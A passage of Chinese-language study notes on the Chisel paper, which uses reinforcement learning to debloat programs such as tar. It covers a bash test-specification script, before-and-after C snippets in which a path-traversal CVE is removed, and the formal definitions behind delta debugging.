PERSES不满足上述特点,这两个工具同Chisel一样,接受一个需要简化的程序和一个质量测试函数作为输入,并输出一个简化的程序</p><ul><li>C-REDUCE满足了与Chisel相同的最小性和正确性标准,但其牺牲了效率,自然度和通用性.C-Reduce针对手写的程序转换规则是定制且紧密耦合的,由于这些规则是短时的,所以C-reduce在寻找简化程序时会产生大量的语义和语法无效的候选程序,此外,该工具经常生成不自然的代码</li><li>Perses同样牺牲了效率和通用性,其简化过程是基于语法引导的,这可以避免在搜索过程中产生语法无意义的候选程序.然而依然无法避免语义无效的候选程序,因为其无法感知程序元素间的语义依赖关系(例如def-use关系). 同时,基于语法感知的简化在每一步都太过保守,因此比C-Reduce效率更低.</li></ul></li><li><p>我们客服现有方法限制的 主要技术见解 是 使用 强化学习 来 加速程序的简化</p><ul><li>通过反复的试错,chisel构建并完善了一个静态模型,来决定每个候选程序通过测试的可能性,该模型可以有效的捕捉程序元素间的语义依赖同时引导搜索至最小程序</li><li>Chisel的学习方法是跨语言的,因为模型是从 尝试的候选程序和他们的属性测试结果 的简单向量中 学习的</li></ul></li><li><p>在10个UNIX上广泛使用的实用程序套件上对Chisel进行评估,Chisel高效地收敛到最小程序,由于其它所有方法.</p><ul><li>并成功修复了10个程序中的6个漏洞(CVE),平均消除了66.2%的gadgets,简化的程序通过SOTA的fuzz:AFL的持续三天的进一步验证</li><li>此外,我们还手动分析了简化后的源码,确认删除功能符合预期,同时保留了诸如 模块化和局部性的理想软件工程实践</li></ul></li><li><p><strong>论文贡献总结</strong></p><ul><li><ol><li>提出Chisel系统来减少程序的大小和复杂度,其目标是从现有软件中移除不需要的功能并减少他们的攻击面</li></ol></li><li><ol start="2"><li>提出了一个通用的强化学习框架,为了更高效和更大的程序简化. 该框架可以在不同目标语言和规范上使用</li></ol></li><li><ol start="3"><li>使用一组UNIX的通用程序对Chisel进行评估,结果显示其可以减少软件的缺陷和攻击面且不引入新的bug</li></ol></li></ul></li></ul><h2 id="2-motivating-example" tabindex="-1">2 MOTIVATING EXAMPLE</h2><ul><li>我们通过一个例子(Unix通用工具 tar)来解释Chisel如何帮助程序员定制和简化程序.<ul><li>假设针对嵌入式 我们需要一个简易的tar,目前针对嵌入式的tar有一个BusyBox.原始的tar提供97个命令行选项,BusyBox仅提供8个</li><li>我们将演示如何通过向Chisel提供简单而高级的规范来自动获取与BusyBox有相同功能的程序</li><li>同时我们还将展示这种简化如何导致 简化的代码 和 安全性的增强. 最后我们解释了如何保证结果程序的鲁棒性</li></ul></li></ul><h3 id="2.1-%E6%98%8E%E7%A1%AEchisel%E7%9A%84%E8%BE%93%E5%85%A5" tabindex="-1">2.1 明确Chisel的输入</h3><ul><li>首先,我们需要用户编写一个高等级的特征规范,该规范描述了程序的期望功能.<ul><li>规范可以是一个脚本程序,其接收一个源程序并编译,并检查编译后的程序恮输出行为是否符合期望,如果不符合返回false,否则返回true</li></ul></li></ul><pre><code class="language-bash">1 #!/bin/bash23 function compile &#123;4 clang −o tar.debloat tar−1.14.c5 return $?6 &#125;78 function core &#123;9 # test 1: archiving multiple files10 touch foo bar11 ./tar.debloat cf foo.tar foo bar12 rm foo bar13 ./tar.debloat xf foo.tar14 test −f foo −a −f bar || exit 11516 # test 2: extracting from stdin17 touch foo18 ./tar.debloat cf foo.tar foo19 rm foo20 cat foo.tar | ./tar.debloat x21 test −f foo || exit 122 ... #12 more tests that exercise the 8 target options23 return 024 &#125;2526 function non_core &#123;27 for test_script in ‘ls other_tests/∗.sh‘; do # for all optional test cases28 &#123; sh −x −e $test_script; &#125; &gt;&amp; log29 grep 'Segmentation fault' log &amp;&amp; exit 130 done31 return 032 &#125;3334 compile || exit 135 core || exit 136 non_core || exit 1</code></pre><ul><li>上述代码是一个可用作规范的脚本程序,该脚本包括三个步骤<ul><li><ol><li>第一步中调用complie函数(第三行),检查源程序是否可以编译</li></ol></li><li><ol start="2"><li>第二步调用core函数来检查程序是否表现出期望的属性,这一步包括14个测试用例,用于测试8个命令行选项,仅在通过全部测试用例时进入下一步</li></ol><ul><li>例如:第14行,第一个测试用例,检测是否可以压缩和解压缩文件</li></ul></li><li><ol start="3"><li>第三步调用non_core避免简化带来新的错误,其指定了一种要求,即调用了简化去掉的功能时,程序至少不能崩溃(第29行),如果没有这个要求,简化器可能会随意地删除非核心功能地代码,这将导致移除删除功能被调用后很容易崩溃和受到攻击</li></ol></li></ul></li><li>为了完成这样的脚本,我们需要广泛覆盖目标功能地测试程序,这些测试用例可以通过开发人员使用自动测试生成技术活回归测试套件来获得.本文中,使用开发人员为原始程序写的测试套件</li></ul><h3 id="2.2-chisel%E4%B8%8E%E5%85%B6%E5%AE%83%E6%96%B9%E6%B3%95%E7%9A%84%E7%BB%93%E6%9E%9C%E6%AF%94%E8%BE%83" tabindex="-1">2.2 Chisel与其它方法的结果比较</h3><ul><li>给定tar的原始程序(45778行,13227个语句),12小时内,Chisel生成了简化版本(1687行,538个语句),而C-Reduce和Perses都无法在12小时内生成简化版本,简化例子如下</li></ul><pre><code class="language-C">1 /∗ Chisel: global variable declarations removed ∗/2 34 char ∗safer_name_suffix (char ∗file_name, int link_target) &#123;5     /∗ Chisel: code containing CVE removed ∗/6     return file_name;7 &#125;89 void extract_archive() &#123;10    char ∗file_name = safer_name_suffix(stat_info.file_name, 0);11    /∗ Chisel: overwriting functionalities removed ∗/12 &#125;1314 void list_archive() &#123; ... /∗ same as original ∗/ &#125;1516 void read_and(void ∗(do_something)(void)) &#123;17  enum read_header status;18  while (...) &#123;19    status = read_header();20      switch (status) &#123;21        case HEADER_SUCCESS: (∗do_something)(); continue;22        /∗ Chisel: unnecessary functionalities removed ∗/23        default: break;24      &#125;25    &#125;26 &#125;2728 /∗ Supports only 8 options: −c, −f, −x, −v, −t, −O, −o, −k ∗/29 int main(int argc, char ∗∗argv) &#123;30    int optchar;31    while (optchar = getopt_long(argc, argv) != −1) &#123;32        switch (optchar) &#123;33          case 'x': read_and(&amp;extract_archive); break;34          case 't': read_and(&amp;list_archive); break;35          /∗ Chisel: unsupported options removed ∗/36        &#125; 37      &#125;38 ... /∗ same as original ∗/39 &#125;/*  Code snippet of the original version of tar*/1 int absolute_names;2 int ignore_zeros_option;3 struct tar_stat_info stat_info;45 char ∗safer_name_suffix (char ∗file_name, int link_target) &#123;6     char ∗p;7     if (absolute_names) &#123;8       p = file_name;9     &#125; else &#123;10      /∗ CVE−2016−6321 ∗/11      /∗ Incorrect sanitization when &quot;file_name&quot; contains &quot;..&quot; ∗/12      /∗ &quot;p&quot; points to the longest suffix of &quot;file_name&quot; without &quot;../&quot; ∗/13      ...14    &#125;15    ...16    return p;17 &#125;1819 void extract_archive() &#123;20    char ∗file_name = safer_name_suffix(stat_info.file_name, 0);21    /∗ Overwrite &quot;file_name&quot; if exists ∗/22    ...23 &#125;2425 void list_archive() &#123; ... &#125;26 void read_and(void ∗(do_something)(void)) &#123;27    while (...) &#123;28       enum read_header status = read_header();29      switch (status) &#123;30        case HEADER_SUCCESS: (∗do_something)(); continue;31        case HEADER_ZERO_BLOCK:32          if (ignore_zeros_option) continue;33          else break;34        ...35        default: break;36      &#125;37    &#125;38  ...39 &#125;4041 /∗ Support all options: −x, −t, −P, −i, ... ∗/42 int main(int argc, char ∗∗argv) &#123;43    int optchar;44    while (optchar = getopt_long(argc, argv) != −1) &#123;45      switch (optchar) &#123;46        case 'x': read_and(&amp;extract_archive); break;47        case 't': read_and(&amp;list_archive); break;48        case 'P': absolute_names = 1; break;49        case 'i': ignore_zeros_option = 1; break;50        ...51      &#125;52    &#125;53  ...54 &#125;</code></pre><ol><li><code>main</code>函数中reduced版本,与原始版本比较,减少了不需要得选项</li><li><code>read_and</code>函数检查输入文件的头部,并在头部无效时进行异常处理,如果头部有效,根据命令调用响应函数.在简化版本中,异常处理部分被移除,头部无效即终止程序</li><li><code>safer_name_suffix</code>函数通过和三处冗余分支得到显著简化</li></ol><ul><li>实现上述简化,不能只是用典型的静态分析和动态分析<ul><li>静态分析保守地保留了所有代码部分,因为在编译时命令行选项和输入文件都是未知的,因此静态方法无法删除函数<code>read_and</code>中的任何代码,因为原本代码中29行status无法确定</li><li>动态可达性不能删除函数<code>safer_name_suffix</code>中的任何代码,因为测试用例中没有执行选项’-P’,所以变量absolute_name总为0,结果动态方法总是覆盖第9行地分支,因此无法删除从原始代码第9行开始的讨论安全漏洞的方法</li></ul></li></ul><h3 id="2.3-%E5%88%86%E6%9E%90chisel%E7%9A%84%E8%BE%93%E5%87%BA" tabindex="-1">2.3 分析Chisel的输出</h3><ul><li>从两方面进行 输出安全漏洞和进一步验证</li></ul><h4 id="%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%A7%BB%E9%99%A4" tabindex="-1">安全漏洞移除</h4><ul><li><p>tar工具在解压缩文件时的安全漏洞和修复措施。原始版本的tar存在一个漏洞，允许攻击者通过恶意构造的路径名覆盖现有文件。开发人员通过忽略包含’…/'的路径名来修复了这个问题。在Chisel版本中，由于删除了相关功能，这个漏洞无法再被利用。</p></li><li><p>详细情况请看论文描述</p></li></ul><h4 id="%E8%BF%9B%E4%B8%80%E6%AD%A5%E9%AA%8C%E8%AF%81" tabindex="-1">进一步验证</h4><ul><li>化简后的程序很小,并且很大程度上保留了语法结构,用户可以很轻松的与源代码进行比较.复杂的代码也可以通过比较工具清晰的展示缩减程度</li><li>此外,化简后的大小和复杂度可以使用准确的自动化技术.<ul><li>为了检查简化版本是否引入了新bug,我们使用现有的技术进行推理(例如 静态/动态分析,模糊测试,运行时监控或验证),来提高正确率</li><li>我们对简化后的tar进行了静态分析和随机模糊测试</li></ul></li><li>去膨胀化使得人工检查静态分析称为可能<ul><li>例如,Sparrow[13]是一种用于发现安全漏洞的静态分析器，它在一秒钟内只为简化后的tar程序生成了19个警报，而原始程序则生成了1,290个警报。经过手动检查，我们得出结论认为所有19个警报都是假的。</li></ul></li><li>去臃肿化后的程序还可以通过随机测试工具（如模糊器）进行高效测试<ul><li>我们在简化后的tar程序上运行了AFL工具[1]，即使在三天内也没有找到任何导致失败的输入。这提高了对去臃肿化后的程序正确性的信心。</li></ul></li></ul><h2 id="3-%E8%83%8C%E6%99%AF" tabindex="-1">3 背景</h2><p>本节正式定义了我们的程序去臃肿化设置,并介绍了基于我们的程序去臃肿化方法的 增量调试和强化学习的概念。</p><h3 id="3.1-%E7%A8%8B%E5%BA%8F%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">3.1 程序去膨胀</h3><ul><li>定义<ul><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>∈</mo><mi mathvariant="double-struck">P</mi><mo separator="true">,</mo><mi mathvariant="double-struck">P</mi></mrow><annotation encoding="application/x-tex">P \in \mathbb{P},\mathbb{P}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8833em;vertical-align:-0.1944em;"></span><span class="mord mathbb">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathbb">P</span></span></span></span></eq>是所有程序的集合</li><li>一个<code>property 属性</code> 定义各位一个属性测试函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo>:</mo><mi mathvariant="double-struck">P</mi><mo>→</mo><mi mathvariant="double-struck">B</mi></mrow><annotation encoding="application/x-tex">O:\mathbb{P} \rightarrow \mathbb{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">B</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">B</mi><mo>=</mo><mo stretchy="false">{</mo><mi>T</mi><mo separator="true">,</mo><mi>F</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\mathbb{B} = \{T,F\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mclose">}</span></span></span></span></eq>,当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">O(P)=T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>时,当且仅当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq>有该属性,否则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi></mrow><annotation encoding="application/x-tex">O(P)=F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq></li><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span></span></span></span></eq>为P的大小,根据一个合适的度量标准,例如语句或符号的数量</li></ul></li><li>给定一个程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq>,一个属性测试函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq>满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">O(P)=T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>,程序去膨胀的目标是找到最小的程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mo lspace="0em" rspace="0em">∗</mo></msup><mo>∈</mo><mi mathvariant="double-struck">P</mi></mrow><annotation encoding="application/x-tex">P^{*} \in \mathbb{P}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">P</span></span></span></span></eq>满足 <section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>P</mi><mo>∗</mo></msup><mo>=</mo><msub><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mtext> </mtext><mi>m</mi><mi>i</mi><mi>n</mi></mrow><mrow><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi mathvariant="double-struck">P</mi></mrow></msub><mi mathvariant="normal">∣</mi><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mtext> </mtext><mtext> </mtext><mtext> </mtext><mtext> </mtext><mtext> </mtext><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mtext> </mtext><mtext> </mtext><mtext> </mtext><mi>O</mi><mo stretchy="false">(</mo><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">P^* = {arg\,min}_{P&#x27; \in \mathbb{P}} |P&#x27;| \,\,\,\,\,s.t.\,\,\,O(P&#x27;)=T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7387em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0734em;vertical-align:-0.2715em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">min</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2381em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathbb mtight">P</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2715em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></span></eqn></section><ul><li>如果实现这个目标则成为全局最小性,但这是NPC问题</li><li>因此实践中去膨胀的追求为一个更可行的目标称为 <code>1-minimality</code>[45]. 一个程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mo>∗</mo></msup><mo>∈</mo><mi mathvariant="double-struck">P</mi></mrow><annotation encoding="application/x-tex">P^* \in \mathbb{P}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6889em;"></span><span class="mord mathbb">P</span></span></span></span></eq>被称为 <code>1-minimality</code>当且仅当对于任意的从<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>∗</mo></mrow><annotation encoding="application/x-tex">P*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∗</span></span></span></span></eq>删除单个元素获得的变体<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">P&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>不能通过属性测试</li></ul></li></ul><h3 id="3.2-delta-debugging(dd-for-short)" tabindex="-1">3.2 Delta Debugging(DD for short)</h3><h4 id="%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0" tabindex="-1">算法描述</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_2.png" alt></p><ul><li>给定程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></eq>和属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq>,DD首先将输入程序转换为列表<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></eq>,其中包含任意粒度(tokens,lines,函数)</li></ul><ol><li>初始化时,将解决方案设为L,分区数设为n(第1,2行)</li><li>当前解决方案候选L划分为n个分区(第4行)</li><li>对于每个分区<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">u_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>算法测试 该分区(或其补集) 是否可以保留属性(第5,7行)</li><li>如果能保留,删除其补集,否则删除分区(第6,8行)</li><li><ol><li>如果一个分区通过属性测试,DD将n设置为2重复该过程;</li><li>如果一个补集通过测试,DD将n设置为n-1,维持当前粒度等级;</li><li>当没有分区和补集通过属性测试时,DD将每个分区分为两半</li></ol></li><li>如果每个分区都不能分割(12行),则返回对应剩余元素列表L的程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">P&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>(13行);</li><li>否则,通过将每个剩余分区分成两半继续主循环(10行)</li><li>此算法最坏复杂度为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>P</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|P|^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span 